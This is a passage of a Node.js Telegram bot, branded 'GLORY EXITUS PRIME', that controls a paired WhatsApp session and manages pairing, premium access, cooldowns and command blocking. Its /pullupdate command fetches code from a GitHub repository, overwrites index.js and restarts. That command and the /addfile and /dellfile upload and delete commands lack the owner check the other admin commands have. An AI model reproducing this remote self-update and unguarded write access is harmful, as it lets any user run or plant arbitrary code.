    delete premiumUsers[userId];
    savePremiumUsers(premiumUsers);
};

const isPremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    if (premiumUsers[userId]) {
        const expiryDate = moment(premiumUsers[userId], 'DD-MM-YYYY');
        if (moment().isBefore(expiryDate)) {
            return true;
        } else {
            removePremiumUser(userId);
            return false;
        }
    }
    return false;
};

const loadCooldown = () => {
    try {
        const data = fs.readFileSync(cooldownFile)
        return JSON.parse(data).cooldown || 0
    } catch {
        return 0
    }
}

const saveCooldown = (seconds) => {
    fs.writeFileSync(cooldownFile, JSON.stringify({ cooldown: seconds }, null, 2))
}

let cooldown = loadCooldown()
const userCooldowns = new Map()

function formatRuntime() {
  let sec = Math.floor(process.uptime());
  let hrs = Math.floor(sec / 3600);
  sec %= 3600;
  let mins = Math.floor(sec / 60);
  sec %= 60;
  return `${hrs}h ${mins}m ${sec}s`;
}

function formatMemory() {
  const usedMB = process.memoryUsage().rss / 1024 / 1024;
  return `${usedMB.toFixed(0)} MB`;
}

const startSesi = async () => {
console.clear();
  console.log(chalk.bold.yellow(`
⠀⠀⠀⣠⠂⢀⣠⡴⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⢤⣄⠀⠐⣄⠀⠀⠀
⠀⢀⣾⠃⢰⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⡆⠸⣧⠀⠀
⢀⣾⡇⠀⠘⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⠁⠀⢹⣧⠀
⢸⣿⠀⠀⠀⢹⣷⣀⣤⣤⣀⣀⣠⣶⠂⠰⣦⡄⢀⣤⣤⣀⣀⣾⠇⠀⠀⠈⣿⡆
⣿⣿⠀⠀⠀⠀⠛⠛⢛⣛⣛⣿⣿⣿⣶⣾⣿⣿⣿⣛⣛⠛⠛⠛⠀⠀⠀⠀⣿⣷
⣿⣿⣀⣀⠀⠀⢀⣴⣿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀⠀⠀⣀⣠⣿⣿
⠛⠻⠿⠿⣿⣿⠟⣫⣶⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣙⠿⣿⣿⠿⠿⠛⠋
⠀⠀⠀⠀⠀⣠⣾⠟⣯⣾⠟⣻⣿⣿⣿⣿⣿⣿⡟⠻⣿⣝⠿⣷⣌⠀⠀⠀⠀⠀
⠀⠀⢀⣤⡾⠛⠁⢸⣿⠇⠀⣿⣿⣿⣿⣿⣿⣿⣿⠀⢹⣿⠀⠈⠻⣷⣄⡀⠀⠀
⢸⣿⡿⠋⠀⠀⠀⢸⣿⠀⠀⢿⣿⣿⣿⣿⣿⣿⡟⠀⢸⣿⠆⠀⠀⠈⠻⣿⣿⡇
⢸⣿⡇⠀⠀⠀⠀⢸⣿⡀⠀⠘⣿⣿⣿⣿⣿⡿⠁⠀⢸⣿⠀⠀⠀⠀⠀⢸⣿⡇
⢸⣿⡇⠀⠀⠀⠀⢸⣿⡇⠀⠀⠈⢿⣿⣿⡿⠁⠀⠀⢸⣿⠀⠀⠀⠀⠀⣼⣿⠃
⠈⣿⣷⠀⠀⠀⠀⢸⣿⡇⠀⠀⠀⠈⢻⠟⠁⠀⠀⠀⣼⣿⡇⠀⠀⠀⠀⣿⣿⠀
⠀⢿⣿⡄⠀⠀⠀⢸⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡇⠀⠀⠀⢰⣿⡟⠀
⠀⠈⣿⣷⠀⠀⠀⢸⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⠃⠀⠀⢀⣿⡿⠁⠀
⠀⠀⠈⠻⣧⡀⠀⠀⢻⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⡟⠀⠀⢀⣾⠟⠁⠀⠀
⠀⠀⠀⠀⠀⠁⠀⠀⠈⢿⣿⡆⠀⠀⠀⠀⠀⠀⣸⣿⡟⠀⠀⠀⠉⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⡄⠀⠀⠀⠀⣰⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠆⠀⠀⠐⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
» Information:
  Developer: @R4f14ndr4
  Version: 3.5.0 
  Status: Bot Connected
  `))
    
const store = makeInMemoryStore({
  logger: require('pino')().child({ level: 'silent', stream: 'store' })
})
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: !usePairingCode,
        logger: pino({ level: "silent" }),
        auth: state,
        browser: ['Mac OS', 'Safari', '10.15.7'],
        getMessage: async (key) => ({
            conversation: 'Apophis',
        }),
    };

    sock = makeWASocket(connectionOptions);
    
    sock.ev.on("messages.upsert", async (m) => {
        try {
            if (!m || !m.messages || !m.messages[0]) {
                return;
            }

            const msg = m.messages[0]; 
            const chatId = msg.key.remoteJid || "Tidak Diketahui";

        } catch (error) {
        }
    });

    sock.ev.on('creds.update', saveCreds);
    store.bind(sock.ev);
    
    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'open') {
        
        if (lastPairingMessage) {
        const connectedMenu = `
<blockquote><b>『 𝗚𝗟𝗢𝗥𝗬 𝗘𝗫𝗜𝗧𝗨𝗦 𝗣𝗥𝗜𝗠𝗘 』</b></blockquote>
↯ Number: ${lastPairingMessage.phoneNumber}
↯ Pairing Code: ${lastPairingMessage.pairingCode}
↯ Status: Connected`;

        try {
          bot.telegram.editMessageCaption(
            lastPairingMessage.chatId,
            lastPairingMessage.messageId,
            undefined,
            connectedMenu,
            { parse_mode: "HTML" }
          );
        } catch (e) {
        }
      }
      
            console.clear();
            isWhatsAppConnected = true;
            const currentTime = moment().tz('Asia/Jakarta').format('HH:mm:ss');
            console.log(chalk.bold.green(`
⠀⠀⠀⠀⠠⠤⠤⠤⠤⠤⣤⣤⣤⣄⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣤⣤⣤⠤⠤⠤⠤⠤⠄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠛⠛⠿⢶⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⡶⠿⠛⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢀⣀⣀⣠⣤⣤⣴⠶⠶⠶⠶⠶⠶⠶⠶⠶⠿⠿⢿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡿⠿⠶⠶⠶⠶⠶⠶⠶⣦⣤⣄⣀⣀⡀⠀⠀
⠚⠛⠉⠉⠉⠀⠀⠀⠀⠀⠀⢀⣀⣀⣤⡴⠶⠶⠿⠿⠿⣧⡀⠀⠀⠀⠤⢄⣀⣀⡀⢀⣷⠿⠿⠿⠶⠶⣤⣀⣀⡀⠀⠀⠀⠀⠉⠉⠛⠛⠒
⠀⠀⠀⠀⠀⠀⠀⢀⣠⡴⠞⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⢸⣿⣷⣶⣦⣤⣄⣈⡑⢦⣀⣸⡇⠀⠀⠀⠀⠀⠀⠈⠉⠛⠳⢦⣄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣠⠔⠚⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⡿⠟⠉⠉⠉⠉⠙⠛⠿⣿⣮⣷⣤⣤⣤⣿⣆⠀⠀⠀⠀⠀⠀⠈⠉⠚⠦⣄⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⢻⣯⣧⠀⠈⢿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⢷⡤⢸⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣦⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣾⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⠛⠻⠿⠿⣿⣶⣶⣦⣄⣀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⣿⣯⡛⠻⢦⡀⢀⡴⠟⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢿⣆⠀⠙⢿⡀⢀⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣆⠀⠈⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⡆⠀⠸⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠃⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀


» Information:
  Developer: @R4f14ndr4
  Version: 3.5.0 
  Status: Sender Connected
  `))
        }

                 if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.red('Koneksi WhatsApp terputus:'),
                shouldReconnect ? 'Mencoba Menautkan Perangkat' : 'Silakan Menautkan Perangkat Lagi'
            );
            if (shouldReconnect) {
                startSesi();
            }
            isWhatsAppConnected = false;
        }
    });
};

startSesi();

const checkWhatsAppConnection = (ctx, next) => {
    if (!isWhatsAppConnected) {
        ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
        return;
    }
    next();
};

const checkCooldown = (ctx, next) => {
    const userId = ctx.from.id
    const now = Date.now()

    if (userCooldowns.has(userId)) {
        const lastUsed = userCooldowns.get(userId)
        const diff = (now - lastUsed) / 1000

        if (diff < cooldown) {
            const remaining = Math.ceil(cooldown - diff)
            ctx.reply(`⏳ ☇ Harap menunggu ${remaining} detik`)
            return
        }
    }

    userCooldowns.set(userId, now)
    next()
}

/*const checkPremium = (ctx, next) => {
    if (!isPremiumUser(ctx.from.id)) {
        ctx.reply("❌ ☇ Akses hanya untuk premium");
        return;
    }
    next();
};

const checkGcPremium = (ctx, next) => {
    if (!isGcPremium(ctx.chat.id)) {
        ctx.reply("❌ ☇ Akses hanya untuk grup premium");
        return;
    }
    next();
};*/

const checkAccess = (ctx, next) => {
    const isUserPrem = isPremiumUser(ctx.from.id);
    const isGroupPrem = isGcPremium(ctx.chat.id);

    // Kalau user BUKAN premium DAN grup BUKAN premium, baru ditolak
    if (!isUserPrem && !isGroupPrem) {
        return ctx.reply("❌ Fitur ini hanya untuk pengguna premium atau grup premium!");
    }

    // Kalau salah satu syarat terpenuhi, lanjut!
    next();
};

bot.command("requestpair", async (ctx) => {
   if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
  const args = ctx.message.text.split(" ")[1];
  if (!args) return ctx.reply("🪧 ☇ Format: /requestpair 62×××");

  const phoneNumber = args.replace(/[^0-9]/g, "");
  if (!phoneNumber) return ctx.reply("❌ ☇ Nomor tidak valid");

  try {
    if (!sock) return ctx.reply("❌ ☇ Socket belum siap, coba lagi nanti");
    if (sock.authState.creds.registered) {
      return ctx.reply(`✅ ☇ WhatsApp sudah terhubung dengan nomor: ${phoneNumber}`);
    }

    const code = await sock.requestPairingCode(phoneNumber, "12345678");  
    const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;  

    const pairingMenu = `
<blockquote><b>『 𝗚𝗟𝗢𝗥𝗬 𝗘𝗫𝗜𝗧𝗨𝗦 𝗣𝗥𝗜𝗠𝗘 』</b></blockquote>
↯ Number: ${phoneNumber}
↯ Pairing Code: <code>${formattedCode}</code>
↯ Status: Not Connected`;

    const sentMsg = await ctx.replyWithPhoto(thumbnailUrl, {  
      caption: pairingMenu,  
      parse_mode: "HTML"  
    });  

    lastPairingMessage = {  
      chatId: ctx.chat.id,  
      messageId: sentMsg.message_id,  
      phoneNumber,  
      pairingCode: formattedCode
    };

  } catch (err) {
    console.error(err);
  }
});

if (sock) {
  sock.ev.on("connection.update", async (update) => {
    if (update.connection === "open" && lastPairingMessage) {
      const updateConnectionMenu = `
<blockquote><b>『 𝗚𝗟𝗢𝗥𝗬 𝗘𝗫𝗜𝗧𝗨𝗦 𝗣𝗥𝗜𝗠𝗘 』</b></blockquote>
↯ Number: ${lastPairingMessage.phoneNumber}
↯ Pairing Code: ${lastPairingMessage.pairingCode}
↯ Status: Connected`;

      try {  
        await bot.telegram.editMessageCaption(  
          lastPairingMessage.chatId,  
          lastPairingMessage.messageId,  
          undefined,  
          updateConnectionMenu,  
          { parse_mode: "HTML" }  
        );  
      } catch (e) {  
      }  
    }
  });
}

bot.command("setcooldown", async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    const seconds = parseInt(args[1]);

    if (isNaN(seconds) || seconds < 0) {
        return ctx.reply("🪧 ☇ Format: /setcooldown 5");
    }

    cooldown = seconds
    saveCooldown(seconds)
    ctx.reply(`✅ ☇ Cooldown berhasil diatur ke ${seconds} detik`);
});

bot.command("resetsession", async (ctx) => {
  if (ctx.from.id != ownerID) {
    return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
  }

  try {
    const sessionDirs = ["./session", "./sessions"];
    let deleted = false;

    for (const dir of sessionDirs) {
      if (fs.existsSync(dir)) {
        fs.rmSync(dir, { recursive: true, force: true });
        deleted = true;
      }
    }

    if (deleted) {
      await ctx.reply("✅ ☇ Session berhasil dihapus, panel akan restart");
      setTimeout(() => {
        process.exit(1);
      }, 2000);
    } else {
      ctx.reply("🪧 ☇ Tidak ada folder session yang ditemukan");
    }
  } catch (err) {
    console.error(err);
    ctx.reply("❌ ☇ Gagal menghapus session");
  }
});

bot.command('addpremium', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    const args = ctx.message.text.split(" ");
    if (args.length < 3) {
        return ctx.reply("🪧 ☇ Format: /addpremium 12345678 30d");
    }
    const userId = args[1];
    const duration = parseInt(args[2]);
    if (isNaN(duration)) {
        return ctx.reply("🪧 ☇ Durasi harus berupa angka dalam hari");
    }
    const expiryDate = addPremiumUser(userId, duration);
    ctx.reply(`✅ ☇ ${userId} berhasil ditambahkan sebagai pengguna premium sampai ${expiryDate}`);
});

bot.command('delpremium', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /delpremium 12345678");
    }
    const userId = args[1];
    removePremiumUser(userId);
        ctx.reply(`✅ ☇ ${userId} telah berhasil dihapus dari daftar pengguna premium`);
});

bot.command('addgcpremium', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 3) {
        return ctx.reply("🪧 ☇ Format: /addgcpremium -12345678 30");
    }

    const groupId = args[1];
    const duration = parseInt(args[2]);

    if (isNaN(duration)) {
        return ctx.reply("🪧 ☇ Durasi harus berupa angka (hari)");
    }

    // Menggunakan helper function
    const expiryDate = addGcPremium(groupId, duration);
    
    ctx.reply(`✅ ☇ ${groupId} berhasil ditambahkan sebagai grup premium sampai ${expiryDate}`);
});

bot.command('delgcpremium', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /delgcpremium -12345678");
    }

    const groupId = args[1];

    // Menggunakan helper function untuk mengecek apakah terdaftar
    if (isGcPremium(groupId)) {
        removeGcPremium(groupId);
        ctx.reply(`✅ ☇ ${groupId} telah berhasil dihapus dari daftar grup premium`);
    } else {
        ctx.reply(`🪧 ☇ ${groupId} tidak ada dalam daftar premium`);
    }
});

// Command buat BLOKIR
// ==================== BLOCK COMMAND SYSTEM ====================

const fsp = fs.promises;
// ================== LOAD CONFIG FROM update.js (NO CACHE) ==================
function loadUpdateConfig() {
  try {
    // pastikan ambil dari root project (process.cwd()), bukan lokasi file lain
    const cfgPath = path.join(process.cwd(), "update.js");

    // hapus cache require biar selalu baca update.js terbaru setelah restart/update
    try {
      delete require.cache[require.resolve(cfgPath)];
    } catch (_) {}

    const cfg = require(cfgPath);
    return (cfg && typeof cfg === "object") ? cfg : {};
  } catch (e) {
    return {};
  }
}

const UPD = loadUpdateConfig();

// ====== CONFIG ======
const GITHUB_OWNER = UPD.github_owner || "Rafijahat13";
const DEFAULT_REPO = UPD.github_repo_default || "Autoupdate";
const GITHUB_BRANCH = UPD.github_branch || "main";
const UPDATE_FILE_IN_REPO = UPD.update_file_in_repo || "index.js";

// token untuk WRITE (add/del)
const GITHUB_TOKEN_WRITE = UPD.github_token_write || "";

// target lokal yang bakal diganti oleh /update
const LOCAL_TARGET_FILE = path.join(process.cwd(), "index.js");

// ================== FETCH HELPER ==================
const fetchFn = global.fetch || ((...args) => import("node-fetch").then(({ default: f }) => f(...args)));

// ================== FILE WRITE ATOMIC ==================
async function atomicWriteFile(targetPath, content) {
  const dir = path.dirname(targetPath);
  const tmp = path.join(dir, `.update_tmp_${Date.now()}_${path.basename(targetPath)}`);
  await fsp.writeFile(tmp, content, { encoding: "utf8" });
  await fsp.rename(tmp, targetPath);
}

// ================== READ (PUBLIC): DOWNLOAD RAW ==================
async function ghDownloadRawPublic(repo, filePath) {
  const rawUrl =
    `https://raw.githubusercontent.com/${encodeURIComponent(GITHUB_OWNER)}/${encodeURIComponent(repo)}` +
    `/${encodeURIComponent(GITHUB_BRANCH)}/${filePath}`;

  const res = await fetchFn(rawUrl, { headers: { "User-Agent": "telegraf-update-bot" } });

  if (!res.ok) {
    const txt = await res.text().catch(() => "");
    throw new Error(`Gagal download ${filePath} (${res.status}): ${txt || res.statusText}`);
  }
  return await res.text();
}

// ================== WRITE (BUTUH TOKEN): GITHUB API ==================
function mustWriteToken() {
  if (!GITHUB_TOKEN_WRITE) {
    throw new Error("Token WRITE kosong. Isi github_token_write di update.js (Contents: Read and write).");
  }
}

function ghWriteHeaders() {
  mustWriteToken();
  return {
    Authorization: `Bearer ${GITHUB_TOKEN_WRITE}`,
    Accept: "application/vnd.github+json",
    "X-GitHub-Api-Version": "2022-11-28",
    "User-Agent": "telegraf-gh-writer",
  };
}

async function ghGetContentWrite(repo, filePath) {
  const url =
    `https://api.github.com/repos/${encodeURIComponent(GITHUB_OWNER)}/${encodeURIComponent(repo)}` +
    `/contents/${encodeURIComponent(filePath)}?ref=${encodeURIComponent(GITHUB_BRANCH)}`;

  const res = await fetchFn(url, { headers: ghWriteHeaders() });

  if (!res.ok) {
    const txt = await res.text().catch(() => "");
    throw new Error(`GitHub GET ${res.status}: ${txt || res.statusText}`);
  }
  return res.json();
}

async function ghPutFileWrite(repo, filePath, contentText, commitMsg) {
  let sha;
  try {
    const existing = await ghGetContentWrite(repo, filePath);
    sha = existing?.sha;
  } catch (e) {
    if (!String(e.message).includes(" 404")) throw e; // 404 => create baru
  }

  const url =
    `https://api.github.com/repos/${encodeURIComponent(GITHUB_OWNER)}/${encodeURIComponent(repo)}` +
    `/contents/${encodeURIComponent(filePath)}`;

  const body = {
    message: commitMsg,
    content: Buffer.from(contentText, "utf8").toString("base64"),
    branch: GITHUB_BRANCH,
    ...(sha ? { sha } : {}),
  };

  const res = await fetchFn(url, {
    method: "PUT",
    headers: { ...ghWriteHeaders(), "Content-Type": "application/json" },
    body: JSON.stringify(body),
  });

  if (!res.ok) {
    const txt = await res.text().catch(() => "");
    throw new Error(`GitHub PUT ${res.status}: ${txt || res.statusText}`);
  }

  return res.json();
}

async function ghDeleteFileWrite(repo, filePath, commitMsg) {
  const info = await ghGetContentWrite(repo, filePath);
  const sha = info?.sha;
  if (!sha) throw new Error("SHA tidak ketemu. Pastikan itu file (bukan folder).");

  const url =
    `https://api.github.com/repos/${encodeURIComponent(GITHUB_OWNER)}/${encodeURIComponent(repo)}` +
    `/contents/${encodeURIComponent(filePath)}`;

  const body = { message: commitMsg, sha, branch: GITHUB_BRANCH };

  const res = await fetchFn(url, {
    method: "DELETE",
    headers: { ...ghWriteHeaders(), "Content-Type": "application/json" },
    body: JSON.stringify(body),
  });

  if (!res.ok) {
    const txt = await res.text().catch(() => "");
    throw new Error(`GitHub DELETE ${res.status}: ${txt || res.statusText}`);
  }

  return res.json();
}

// ================== COMMANDS ==================

// /update [repoOptional]
// download update_index.js -> replace local index.js -> restart
bot.command("pullupdate", async (ctx) => {
  try {
    const parts = (ctx.message.text || "").trim().split(/\s+/);
    const repo = parts[1] || DEFAULT_REPO;

    await ctx.reply("🔄 Bot akan update otomatis.\n♻️ Tunggu proses 1–3 menit...");
    await ctx.reply(`⬇️ Mengambil update dari GitHub: *${repo}/${UPDATE_FILE_IN_REPO}* ...`, { parse_mode: "Markdown" });

    const newCode = await ghDownloadRawPublic(repo, UPDATE_FILE_IN_REPO);

    if (!newCode || newCode.trim().length < 50) {
      throw new Error("File update terlalu kecil/kosong. Pastikan update_index.js bener isinya.");
    }

    // backup index.js lama
    try {
      const backup = path.join(process.cwd(), "index.backup.js");
      await fsp.copyFile(LOCAL_TARGET_FILE, backup);
    } catch (_) {}

    await atomicWriteFile(LOCAL_TARGET_FILE, newCode);

    await ctx.reply("✅ Update berhasil diterapkan.\n♻️ Restarting panel...");

    setTimeout(() => process.exit(0), 3000);
  } catch (err) {
    await ctx.reply(`❌ Update gagal: ${err.message || String(err)}`);
  }
});

// /addfiles <repo> (reply file .js)
bot.command("addfile", async (ctx) => {
  try {
    const parts = (ctx.message.text || "").trim().split(/\s+/);
    const repo = parts[1] || DEFAULT_REPO;

    const replied = ctx.message.reply_to_message;
    const doc = replied?.document;

    if (!doc) {
      return ctx.reply("❌ Reply file .js dulu, lalu ketik:\n/addfiles <namerepo>\nContoh: /addfiles Pullupdate");
    }

    const fileName = doc.file_name || "file.js";
    if (!fileName.endsWith(".js")) return ctx.reply("❌ File harus .js");

    await ctx.reply(`⬆️ Uploading *${fileName}* ke repo *${repo}*...`, { parse_mode: "Markdown" });

    const link = await ctx.telegram.getFileLink(doc.file_id);
    const res = await fetchFn(link.href);
    if (!res.ok) throw new Error(`Gagal download file telegram: ${res.status}`);

    const contentText = await res.text();

    await ghPutFileWrite(repo, fileName, contentText, `Add/Update ${fileName} via bot`);

    await ctx.reply(`✅ Berhasil upload *${fileName}* ke repo *${repo}*`, { parse_mode: "Markdown" });
  } catch (err) {
    await ctx.reply(`❌ Gagal: ${err.message || String(err)}`);
  }
});

// /delfiles <repo> <path/file.js>
bot.command("dellfile", async (ctx) => {
  try {
    const parts = (ctx.message.text || "").trim().split(/\s+/);
    const repo = parts[1] || DEFAULT_REPO;
    const file = parts[2];

    if (!file) {
      return ctx.reply("Format:\n/delfiles <namerepo> <namefiles>\nContoh: /delfiles Pullupdate index.js");
    }

    await ctx.reply(`🗑️ Menghapus *${file}* di repo *${repo}*...`, { parse_mode: "Markdown" });

    await ghDeleteFileWrite(repo, file, `Delete ${file} via bot`);

    await ctx.reply(`✅ Berhasil hapus *${file}* di repo *${repo}*`, { parse_mode: "Markdown" });
  } catch (err) {
    await ctx.reply(`❌ Gagal: ${err.message || String(err)}`);
  }
});
  
// ====== /restart ======
bot.command("restart", async (ctx) => {
  await ctx.reply("♻️ Panel akan *restart manual* untuk menjaga kestabilan...");

  // kirim status ke grup utama kalau ada
  try {
    if (typeof sendToGroupsUtama === "function") {
      sendToGroupsUtama(
        "🟣 *Status Panel:*\n♻️ Panel akan *restart manual* untuk menjaga kestabilan...",
        { parse_mode: "Markdown" }
      );
    }
  } catch (e) {}

  setTimeout(() => {
    try {
      if (typeof sendToGroupsUtama === "function") {
        sendToGroupsUtama(
          "🟣 *Status Panel:*\n✅ Panel berhasil restart dan kembali aktif!",
          { parse_mode: "Markdown" }
        );
      }
    } catch (e) {}
  }, 8000);

  setTimeout(() => process.exit(0), 5000);
});



// ==================== COMMAND BLOCK ====================
bot.command("block", async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.trim().split(/\s+/).slice(1);
    const cmd = args[0] ? args[0].toLowerCase().replace(/^\//, '') : '';

    if (!cmd) {
        const blocked = getBlocked();
        const list = blocked.length > 0
            ? blocked.map((c, i) => `${i + 1}. /${c}`).join('\n')
            : 'Tidak ada command yang diblok.';

        return ctx.reply(
            `<blockquote><pre><b>𑁍┊GLORY EXITUS PRIME</b>\n` +
            `━━━━━━━━━━━━━━⪼\n` +
            `┊ 🔒 COMMAND BLOCKED\n` +
            `━━━━━━━━━━━━━━⪼\n` +
            `${list}\n` +
            `━━━━━━━━━━━━━━⪼\n` +
            `📌 Format:\n` +
`/block [command] - Blokir command\n` +
`/unblock [command] - Buka blokir\n` +
`/unblockall - Buka semua</pre></blockquote>`,
            { parse_mode: "HTML" }
        );
    }

    const blocked = getBlocked();
    if (blocked.includes(cmd)) {
        return ctx.reply(`⚠️ Command /${cmd} sudah diblok sebelumnya.`);
    }

    blocked.push(cmd);
    saveBlocked(blocked);
    ctx.reply(`✅ Command /${cmd} berhasil diblokir.`);
});

// ==================== COMMAND UNBLOCK ====================
bot.command("unblock", async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.trim().split(/\s+/).slice(1);
    const cmd = args[0] ? args[0].toLowerCase().replace(/^\//, '') : '';

    if (!cmd) return ctx.reply(`🪧 Format: /unblock <command>`);

    let blocked = getBlocked();
    if (!blocked.includes(cmd)) {
        return ctx.reply(`⚠️ Command /${cmd} tidak ada di daftar blokir.`);
    }

    blocked = blocked.filter(c => c !== cmd);
    saveBlocked(blocked);
    ctx.reply(`✅ Command /${cmd} berhasil dibuka.`);
});

// ==================== COMMAND UNBLOCKALL ====================
bot.command("unblockall", async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    saveBlocked([]);
    ctx.reply(`✅ Semua command berhasil dibuka dari blokir.`);
});

// ==================== COMMAND LISTBLOCK ====================
bot.command("listblock", async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const blocked = getBlocked();
    const list = blocked.length > 0
        ? blocked.map((c, i) => `${i + 1}. /${c}`).join('\n')
        : 'Tidak ada command yang diblok.';

    ctx.reply(
        `<blockquote><pre><b>𑁍┊LIST BLOCKED COMMANDS</b>\n` +
        `━━━━━━━━━━━━━━⪼\n` +
        `${list}</pre></blockquote>`,
        { parse_mode: "HTML" }
    );
});


bot.use(async (ctx, next) => {
    try {
        const text = ctx.message && (ctx.message.text || ctx.message.caption) || '';
        if (!text.startsWith('/')) return next();
        const cmdMatch = text.match(/^\/([a-zA-Z0-9_]+)/);
        if (!cmdMatch) return next();
        const cmdName = cmdMatch[1].toLowerCase();
        const bypass = ['block', 'unblock', 'unblockall', 'listblock', 'start'];
